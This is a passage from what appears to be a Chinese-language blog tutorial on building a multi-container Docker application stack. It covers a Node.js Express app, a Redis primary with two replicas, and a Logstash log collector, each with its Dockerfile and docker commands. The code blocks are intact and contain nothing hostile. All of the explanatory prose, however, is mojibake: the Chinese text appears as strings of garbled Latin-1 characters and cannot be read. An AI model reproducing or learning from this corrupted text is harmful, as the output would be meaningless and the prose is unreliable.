href="https://github.com/turnbullpress/dockerbook-code/tree/master/code/6/node/nodejs/nodeapp" target="_blank" rel="noopener">https://github.com/turnbullpress/dockerbook-code/tree/master/code/6/node/nodejs/nodeapp</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/turnbullpress/dockerbook-code/master/code/6/node/nodejs/nodeapp/package.json</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/turnbullpress/dockerbook-code/master/code/6/node/nodejs/nodeapp/server.js</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰æ­¥å›åˆ°<code>nodejs</code>ç›®å½•ä¸‹ï¼Œåˆ›å»ºDockerfileæ–‡ä»¶ã€‚è¿™ä¸ªé•œåƒå®‰è£…äº†Nodeï¼Œç„¶åæˆ‘ä»¬å°†<code>nodeapp</code>çš„æºä»£ç é€šè¿‡ADDæŒ‡ä»¤æ·»åŠ åˆ°<code>/opt/nodeapp</code>ç›®å½•ã€‚è¿™ä¸ªNode.jsåº”ç”¨æ˜¯ä¸€ä¸ªç®€å•çš„ExpressæœåŠ¡å™¨ï¼ŒåŒ…å«äº†<code>package.json</code>æ–‡ä»¶å’Œå®é™…åº”ç”¨ä»£ç çš„<code>server.js</code>æ–‡ä»¶ã€‚<code>server.js</code>æ–‡ä»¶å¼•å…¥äº†æ‰€æœ‰çš„ä¾èµ–ï¼Œå¹¶å¯åŠ¨äº†Expressåº”ç”¨ï¼ŒExpressåº”ç”¨æŠŠsessionä¿¡æ¯ä¿å­˜åˆ°Redisé‡Œï¼Œå¹¶åˆ›å»ºäº†ä¸€ä¸ªä»¥JSONæ ¼å¼è¿”å›çŠ¶æ€ä¿¡æ¯çš„èŠ‚ç‚¹ï¼Œè¿™ä¸ªèŠ‚ç‚¹é»˜è®¤ä½¿ç”¨redis_primaryä½œä¸ºä¸»æœºåå»è¿æ¥Redisã€‚è¿™ä¸ªåº”ç”¨ä¼šæŠŠæ—¥å¿—è®°å½•åˆ°<code>/var/log/nodeapp/nodeapp.log</code>æ–‡ä»¶é‡Œï¼Œå¹¶ç›‘å¬3000ç«¯å£ã€‚æˆ‘ä»¬è¿˜å°†å·¥ä½œç›®å½•è®¾ç½®ä¸º<code>/opt/nodeapp</code>ï¼Œå¹¶ä¸”å®‰è£…äº†Nodeåº”ç”¨çš„å¿…è¦è½¯ä»¶åŒ…ï¼Œè¿˜åˆ›å»ºäº†ç”¨äºå­˜æ”¾Nodeåº”ç”¨æ—¥å¿—çš„å·<code>/var/log/nodeapp</code>ï¼Œæœ€åå…¬å¼€äº†3000ç«¯å£ï¼Œå¹¶ä½¿ç”¨ENTRYPOINTæŒ‡å®šäº†è¿è¡ŒNodeåº”ç”¨çš„å‘½ä»¤</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span> apt-get -qq update</span><br><span class="line"><span class="keyword">RUN</span> apt-get -qq install nodejs npm</span><br><span class="line"><span class="keyword">RUN</span> mkdir -p /var/log/nodeapp</span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span> nodeapp /opt/nodeapp/</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span> /opt/nodeapp</span><br><span class="line"><span class="keyword">RUN</span> npm install</span><br><span class="line"></span><br><span class="line"><span class="keyword">VOLUME</span> [ "/var/log/nodeapp" ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">3000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span> [ "nodejs", "server.js" ]</span><br></pre></td></tr></table></figure><p>ç¬¬å››æ­¥æ„å»ºé•œåƒ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t elssm/nodejs .</span><br></pre></td></tr></table></figure><h4 id="RedisåŸºç¡€é•œåƒ"><a href="#RedisåŸºç¡€é•œåƒ" class="headerlink" title="RedisåŸºç¡€é•œåƒ"></a>RedisåŸºç¡€é•œåƒ</h4><p>ç¬¬ä¸€æ­¥å…ˆåœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªåä¸º<code>redis_base</code>çš„æ–‡ä»¶å¤¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir redis_base &amp;&amp; cd redis_base</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒæ­¥åˆ›å»ºDockerfileæ–‡ä»¶ã€‚è¿™ä¸ªRedisåŸºç¡€é•œåƒä»PPAåº“å®‰è£…äº†æœ€æ–°ç‰ˆæœ¬çš„RedisåŒ…ã€‚å¹¶æŒ‡å®šäº†ä¸¤ä¸ªå·ï¼Œå…¬å¼€äº†Redisçš„é»˜è®¤ç«¯å£æ˜¯6379ã€‚æˆ‘ä»¬åªæ˜¯è®²è¿™ä¸ªé•œåƒä½œä¸ºåŸºç¡€é•œåƒä»è€Œæ„å»ºåˆ«çš„é•œåƒï¼Œå› æ­¤ä¸ä¼šæ‰§è¡Œè¿™ä¸ªé•œåƒã€‚</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span> apt-get -qq update</span><br><span class="line"><span class="keyword">RUN</span> apt-get install -qq software-properties-common</span><br><span class="line"><span class="keyword">RUN</span> add-apt-repository ppa:chris-lea/redis-server</span><br><span class="line"><span class="keyword">RUN</span> apt-get -qq update</span><br><span class="line"><span class="keyword">RUN</span> apt-get -qq install redis-server redis-tools</span><br><span class="line"></span><br><span class="line"><span class="keyword">VOLUME</span> [ "/var/lib/redis", "/var/log/redis" ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">6379</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span> []</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰æ­¥æ„å»ºRedisåŸºç¡€é•œåƒ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t elssm/redis .</span><br></pre></td></tr></table></figure><h4 id="Redisä¸»é•œåƒ"><a href="#Redisä¸»é•œåƒ" class="headerlink" title="Redisä¸»é•œåƒ"></a>Redisä¸»é•œåƒ</h4><p>ç¬¬ä¸€æ­¥å…ˆåœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªåä¸º<code>redis_primary</code>çš„æ–‡ä»¶å¤¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir redis_primary &amp;&amp; cd redis_primary</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒæ­¥åˆ›å»ºDockerfileæ–‡ä»¶ã€‚Redisä¸»é•œåƒåŸºäºRedisåŸºç¡€é•œåƒï¼Œå¹¶é€šè¿‡ENTRYPOINTæŒ‡å®šäº†RedisæœåŠ¡å¯åŠ¨å‘½ä»¤ï¼Œå°†RedisæœåŠ¡çš„æ—¥å¿—æ–‡ä»¶ä¿å­˜åˆ°<code>/var/log/redis/redis-server.log</code></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> elssm/redis</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span> [ "redis-server", "--protected-mode no", "--logfile /var/log/redis/redis-server.log" ]</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰æ­¥æ„å»ºRedisä¸»å¥–é¡¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t elssm/redis_primary .</span><br></pre></td></tr></table></figure><h4 id="Rediså‰¯æœ¬é•œåƒ"><a href="#Rediså‰¯æœ¬é•œåƒ" class="headerlink" title="Rediså‰¯æœ¬é•œåƒ"></a>Rediså‰¯æœ¬é•œåƒ</h4><p>ä¸ºäº†é…åˆRedisä¸»é•œåƒï¼Œæˆ‘ä»¬ä¼šåˆ›å»ºRediså‰¯æœ¬é•œåƒï¼Œä¿è¯ä¸ºNode.jsåº”ç”¨æä¾›RedisæœåŠ¡çš„å†—ä½™åº¦ã€‚</p><p>ç¬¬ä¸€æ­¥å…ˆåœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªåä¸º<code>redis_replica</code>çš„æ–‡ä»¶å¤¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir redis_replica &amp;&amp; cd redis_replica</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒæ­¥åˆ›å»ºDockerfileæ–‡ä»¶ã€‚Rediså‰¯æœ¬é•œåƒä¹Ÿæ˜¯åŸºäºRedisåŸºç¡€é•œåƒæ„å»ºçš„ã€‚å¹¶é€šè¿‡ENTRYPOINTæŒ‡å®šäº†è¿è¡ŒRedisæœåŠ¡å™¨çš„å‘½ä»¤ï¼Œè®¾ç½®äº†æ—¥å¿—æ–‡ä»¶å­˜å‚¨ä½ç½®å’Œ<code>slaveof</code>é€‰é¡¹ï¼Œè¿™æ ·å°±æŠŠRedisé…ç½®ä¸ºä¸»-å‰¯æœ¬æ¨¡å¼ï¼Œä»è¿™ä¸ªé•œåƒæ„å»ºçš„ä»»ä½•å®¹å™¨éƒ½ä¼šå°†redis_primaryä¸»æœºçš„Redisä½œä¸ºä¸»æœåŠ¡ï¼Œè¿æ¥å…¶6379ç«¯å£ï¼Œæˆä¸ºå¯¹åº”çš„å‰¯æœ¬æœåŠ¡å™¨</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> elssm/redis</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span> [ "redis-server", "--protected-mode no", "--logfile /var/log/redis/redis-replica.log", "--slaveof redis_primary 6379" ]</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰æ­¥æ„å»ºRediså‰¯æœ¬é•œåƒ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t elssm/redis_replica .</span><br></pre></td></tr></table></figure><h4 id="åˆ›å»ºRedisåç«¯é›†ç¾¤"><a href="#åˆ›å»ºRedisåç«¯é›†ç¾¤" class="headerlink" title="åˆ›å»ºRedisåç«¯é›†ç¾¤"></a>åˆ›å»ºRedisåç«¯é›†ç¾¤</h4><p>ç°åœ¨æˆ‘ä»¬å·²ç»æœ‰äº†Redisä¸»é•œåƒå’Œå‰¯æœ¬é•œåƒã€‚å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="/2021/10/11/Dockeræ„å»ºå¤šå®¹å™¨åº”ç”¨æ ˆ/1.png" alt="1"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥æ„å»ºè‡ªå·±çš„Redisç¯å¢ƒäº†ã€‚é¦–å…ˆæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç”¨æ¥è¿è¡Œæˆ‘ä»¬çš„Expressåº”ç”¨ç¨‹åºçš„ç½‘ç»œï¼Œåä¸º<code>express</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network create express</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>docker network ls</code>æŸ¥çœ‹ç½‘ç»œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network ls</span><br></pre></td></tr></table></figure><p><img src="/2021/10/11/Dockeræ„å»ºå¤šå®¹å™¨åº”ç”¨æ ˆ/2.png" alt="2"></p><p>ç°åœ¨è®©æˆ‘ä»¬åœ¨è¿™ä¸ªç½‘ç»œä¸­è¿è¡ŒRedisä¸»å®¹å™¨ï¼Œå¦‚ä¸‹ä»£ç æ‰€ç¤º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -h redis_primary --net express --name redis_primary elssm/redis_primary</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨<code>docker run</code>å‘½ä»¤ä»<code>elssm/redis_primary</code>é•œåƒåˆ›å»ºäº†ä¸€ä¸ªå®¹å™¨ã€‚<code>-h</code>ç”¨æ¥è®¾ç½®å®¹å™¨çš„ä¸»æœºåã€‚è¿™ä¼šè¦†ç›–é»˜è®¤çš„è¡Œä¸º(é»˜è®¤å°†å®¹å™¨çš„ä¸»æœºåè®¾ç½®ä¸ºå®¹å™¨ID)å¹¶å…è®¸æˆ‘ä»¬æŒ‡å®šè‡ªå·±çš„ä¸»æœºåï¼Œä½¿ç”¨è¿™ä¸ªæ ‡å¿—å¯ä»¥ç¡®ä¿å®¹å™¨ä½¿ç”¨<code>redis_primary</code>ä½œä¸ºä¸»æœºåï¼Œå¹¶è¢«æœ¬åœ°çš„DNSæœåŠ¡æ­£ç¡®è§£æã€‚<code>--net</code>ç¡®ä¿è¯¥å®¹å™¨åœ¨<code>express</code>ç½‘ç»œä¸­è¿è¡Œï¼Œ<code>--name</code>ç¡®ä¿å®¹å™¨çš„åå­—æ˜¯<code>redis_primary</code>        </p><p>æ¥ä¸‹æ¥ä½¿ç”¨<code>docker logs</code>å‘½ä»¤æ¥æŸ¥çœ‹Redisä¸»å®¹å™¨çš„è¿è¡Œæƒ…å†µ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs redis_primary</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤åå‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œè¿™æ˜¯å› ä¸ºRedisæœåŠ¡ä¼šå°†æ—¥å¿—è®°å½•åˆ°ä¸€ä¸ªæ–‡ä»¶è€Œä¸æ˜¯è®°å½•åˆ°æ ‡å‡†è¾“å‡ºï¼Œæ‰€æœ‰ä½¿ç”¨DockeræŸ¥ä¸åˆ°ä»»ä½•æ—¥å¿—ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¹‹å‰åˆ›å»ºçš„<code>/var/log/redis</code>å·ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm --volumes-from redis_primary ubuntu cat /var/log/redis/redis-server.log</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>-it</code>æ˜¯ä»¥äº¤äº’æ–¹å¼è¿è¡Œäº†å¦ä¸€ä¸ªå®¹å™¨ï¼Œ<code>--rm</code>ä¼šåœ¨è¿›ç¨‹è¿è¡Œå®Œåè‡ªåŠ¨åˆ é™¤å®¹å™¨ã€‚<code>--volumes-from</code>å‘Šè¯‰å®ƒä»<code>redis_primary</code>å®¹å™¨æŒ‚è½½äº†æ‰€æœ‰çš„å·ï¼Œç„¶åæˆ‘ä»¬æŒ‡å®šäº†ä¸€ä¸ªubuntuåŸºç¡€é•œåƒï¼Œå¹¶æ‰§è¡Œcatå‘½ä»¤æ¥æŸ¥çœ‹æ—¥å¿—ï¼Œè¿™ç§æ–¹å¼åˆ©ç”¨äº†å·çš„ä¼˜ç‚¹ï¼Œå¯ä»¥ç›´æ¥ä»    <code>redis_primary</code>å®¹å™¨æŒ‚è½½<code>/var/log/redis</code>ç›®å½•å¹¶è¯»å–é‡Œé¢çš„æ—¥å¿—æ–‡ä»¶ï¼Œæ—¥å¿—æ–‡ä»¶å†…å®¹å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="/2021/10/11/Dockeræ„å»ºå¤šå®¹å™¨åº”ç”¨æ ˆ/3.png" alt="3"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªRediså‰¯æœ¬å®¹å™¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -h redis_replica1 --name redis_replica1 --net express elssm/redis_replica</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬è¿è¡Œäº†å¦ä¸€ä¸ªå®¹å™¨ï¼Œè¿™ä¸ªå®¹å™¨æ¥è‡ª<code>elssm/redis_replica</code>é•œåƒï¼Œ<code>-d</code>æ ‡å¿—åœ¨åå°è¿è¡Œï¼Œ<code>-h</code>æŒ‡å®šä¸»æœºåï¼Œ<code>--name</code>æŒ‡å®šå®¹å™¨åï¼Œ<code>--net</code>æŒ‡å®šåœ¨<code>express</code>ç½‘ç»œä¸­è¿è¡ŒRediså‰¯æœ¬å®¹å™¨ã€‚</p><p>å’ŒæŸ¥çœ‹Redisä¸»å®¹å™¨ä¸€æ ·ï¼Œæˆ‘ä»¬æ¥æŸ¥çœ‹ä¸€ä¸‹Rediså‰¯æœ¬å®¹å™¨ä¸­çš„æ—¥å¿—</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm --volumes-from redis_replica1 ubuntu cat /var/log/redis/redis-replica.log</span><br></pre></td></tr></table></figure><p>æ—¥å¿—æ–‡ä»¶å†…å®¹å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="/2021/10/11/Dockeræ„å»ºå¤šå®¹å™¨åº”ç”¨æ ˆ/4.png" alt="4"></p><p>åˆ°è¿™é‡Œæˆ‘ä»¬å·²ç»æˆåŠŸå¯åŠ¨äº†redis_primaryå’Œredis_replica1å®¹å™¨ï¼Œå¹¶è®©è¿™ä¸¤ä¸ªå®¹å™¨è¿›è¡Œä¸»ä»å¤åˆ¶ã€‚ç°åœ¨æˆ‘ä»¬å†æ¥åŠ å…¥å¦ä¸€ä¸ªå®¹å™¨å‰¯æœ¬redis_replica2ï¼Œä»è€Œç¡®ä¿ä¸‡æ— ä¸€å¤±ï¼</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -h redis_replica2 --name redis_replica2 --net express elssm/redis_replica</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å‰¯æœ¬redis_replica2å®¹å™¨ä¸­çš„æ—¥å¿—</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm --volumes-from redis_replica2 ubuntu cat /var/log/redis/redis-replica.log</span><br></pre></td></tr></table></figure><p>å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="/2021/10/11/Dockeræ„å»ºå¤šå®¹å™¨åº”ç”¨æ ˆ/5.png" alt="5"></p><h4 id="åˆ›å»ºNodeå®¹å™¨"><a href="#åˆ›å»ºNodeå®¹å™¨" class="headerlink" title="åˆ›å»ºNodeå®¹å™¨"></a>åˆ›å»ºNodeå®¹å™¨</h4><p>ç°åœ¨æˆ‘ä»¬å·²ç»è®©Redisé›†ç¾¤è¿è¡Œäº†ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºNode.jsåº”ç”¨å¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼Œä»£ç å¦‚ä¸‹æ‰€ç¤º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name nodeapp -p 3000:3000 --net express elssm/nodejs</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ä»<code>elssm/nodejs</code>é•œåƒåˆ›å»ºäº†ä¸€ä¸ªæ–°å®¹å™¨ï¼Œå‘½åä¸º<code>nodeapp</code>ï¼Œå¹¶å°†å®¹å™¨å†…çš„3000ç«¯å£æ˜ å°„åˆ°å®¿ä¸»æœºçš„3000ç«¯å£ï¼ŒåŒæ ·æˆ‘ä»¬çš„<code>nodeapp</code>å®¹å™¨ä¹Ÿæ˜¯è¿è¡Œåœ¨expressç½‘ç»œä¸­çš„ã€‚</p><p>ä½¿ç”¨<code>docker logs</code>å‘½ä»¤æ¥æŸ¥çœ‹<code>nodeapp</code>å®¹å™¨åœ¨åšä»€ä¹ˆ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> docker logs nodeapp</span><br><span class="line">Listening on port 3000</span><br></pre></td></tr></table></figure><p>è®¿é—®æœ¬åœ°3000ç«¯å£ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="/2021/10/11/Dockeræ„å»ºå¤šå®¹å™¨åº”ç”¨æ ˆ/6.png" alt="6"></p><p>è¿™ä¸ªè¾“å‡ºè¡¨æ˜åº”ç”¨æ­£åœ¨å·¥ä½œï¼Œæµè§ˆå™¨çš„ä¼šè¯çŠ¶æ€(session)å›å…ˆè¢«è®°å½•åˆ°Redisä¸»å®¹å™¨redis_primaryï¼Œç„¶åå¤åˆ¶åˆ°ä¸¤ä¸ªRediså‰¯æœ¬å®¹å™¨redis_replica1å’Œredis_replica2</p><h4 id="æ•è·åº”ç”¨æ—¥å¿—"><a href="#æ•è·åº”ç”¨æ—¥å¿—" class="headerlink" title="æ•è·åº”ç”¨æ—¥å¿—"></a>æ•è·åº”ç”¨æ—¥å¿—</h4><p>ç°åœ¨åº”ç”¨å·²ç»æ­£å¸¸è¿è¡Œäº†ï¼Œæˆ‘ä»¬éœ€è¦æŠŠè¿™ä¸ªåº”ç”¨æ”¾åˆ°ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒé‡Œéœ€è¦ç¡®ä¿å¯ä»¥æ•è·æ—¥å¿—å¹¶å°†æ—¥å¿—ä¿å­˜åˆ°æ—¥å¿—æœåŠ¡å™¨ã€‚æˆ‘ä»¬å°†ä½¿ç”¨Logstashæ¥å®Œæˆè¿™ä»¶äº‹ï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ªLogstashé•œåƒã€‚</p><p>ç¬¬ä¸€æ­¥è¿˜æ˜¯åœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªåä¸º<code>logstash</code>çš„æ–‡ä»¶å¤¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir logstash &amp;&amp; cd logstash</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒæ­¥åˆ›å»ºDockerfileæ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:18.04</span><br><span class="line"></span><br><span class="line">RUN apt-get -qq update</span><br><span class="line">RUN apt-get -qq install wget gnupg2 openjdk-8-jdk</span><br><span class="line">RUN wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | apt-key add -</span><br><span class="line">RUN echo "deb https://artifacts.elastic.co/packages/5.x/apt stable main" | tee -a /etc/apt/sources.list.d/elastic-5.x.list</span><br><span class="line">RUN apt-get -qq update</span><br><span class="line">RUN apt-get -qq install logstash</span><br><span class="line"></span><br><span class="line">WORKDIR /usr/share/logstash</span><br><span class="line"></span><br><span class="line">ADD logstash.conf /usr/share/logstash/</span><br><span class="line"></span><br><span class="line">ENTRYPOINT [ "bin/logstash" ]</span><br><span class="line">CMD [ "-f", "logstash.conf", "--config.reload.automatic" ]</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé•œåƒåœ¨å®‰è£…äº†Logstashä¹‹åï¼Œå°†<code>logstash.conf</code>æ–‡ä»¶ä½¿ç”¨ADDæŒ‡ä»¤æ·»åŠ åˆ°äº†<code>/usr/share/logstash/</code>ç›®å½•ã€‚<code>logstash.conf</code>æ–‡ä»¶å’ŒDockerfileåœ¨ç»Ÿè®¡ç›®å½•ä¸‹ï¼Œå®ƒçš„å†…å®¹å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">  file &#123;</span><br><span class="line">    type =&gt; "syslog"</span><br><span class="line">    path =&gt; ["/var/log/nodeapp/nodeapp.log", "/var/log/redis/redis-server.log"]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">output &#123;</span><br><span class="line">  stdout &#123;</span><br><span class="line">    codec =&gt; rubydebug</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªlogstashé…ç½®å¾ˆç®€å•ï¼Œå®ƒç›‘æ§ä¸¤ä¸ªæ–‡ä»¶<code>/var/log/nodeapp/nodeapp.log</code>å’Œ<code>/var/log/redis/redis-server.log</code>ã€‚logstashä¼šä¸€ç›´ç›‘æ§è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œå°†å…¶ä¸­æ–°çš„å†…å®¹å‘é€ä¸ªLogstashï¼Œé…ç½®æ–‡ä»¶çš„ç¬¬äºŒéƒ¨åˆ†æ˜¯outputéƒ¨åˆ†ï¼Œæ¥å—æ‰€æœ‰logstashè¾“å…¥çš„å†…å®¹å¹¶å°†å…¶è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºä¸Šï¼Œåœ¨å®é™…æƒ…å†µä¸­ï¼Œä¸€èˆ¬ä¼šå°†logstashé…ç½®ä¸ºè¾“å‡ºåˆ°ElasticSearché›†ç¾¤æˆ–è€…æ˜¯å…¶ä»–çš„ç›®çš„åœ°ã€‚</p><p>ç¬¬ä¸‰æ­¥æ„å»ºlogstashé•œåƒ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t elssm/logstash .</span><br></pre></td></tr></table></figure><p>é•œåƒæ„å»ºæˆåŠŸä¹‹åï¼Œæˆ‘ä»¬ä»è¿™ä¸ªé•œåƒå¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name logstash --volumes-from redis_primary --volumes-from nodeapp elssm/logstash</span><br></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬å°±å¯åŠ¨äº†ä¸€ä¸ªåä¸ºlogstashçš„æ–°å®¹å™¨ï¼Œå¹¶é€šè¿‡<code>--volumes-from</code>æ ‡å¿—åˆ†åˆ«æŒ‚è½½äº†redis_primaryå’Œnodeappå®¹å™¨çš„å·ï¼Œè¿™æ ·å°±å¯ä»¥è®¿é—®Rediså’ŒNodeçš„æ—¥å¿—æ–‡ä»¶äº†ï¼Œä»»ä½•åŠ åˆ°è¿™äº›æ—¥å¿—æ–‡ä»¶é‡Œçš„å†…å®¹éƒ½ä¼šååº”åœ¨logstashå®¹å™¨çš„å·é‡Œã€‚</p><p>ç°åœ¨å¯ä»¥ä½¿ç”¨<code>-f</code>æ ‡å¿—æ¥æŸ¥çœ‹logstashå®¹å™¨çš„æ—¥å¿—</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f logstash</span><br></pre></td></tr></table></figure><p>åœ¨æµè§ˆå™¨é‡Œåˆ·æ–°Webåº”ç”¨ä¹‹åï¼Œä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„æ—¥å¿—æ—¶é—´ï¼Œæˆ‘ä»¬å°±èƒ½åœ¨logstashå®¹å™¨çš„è¾“å‡ºä¸­çœ‹åˆ°è¿™ä¸ªäº‹ä»¶ã€‚å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="/2021/10/11/Dockeræ„å»ºå¤šå®¹å™¨åº”ç”¨æ ˆ/7.png" 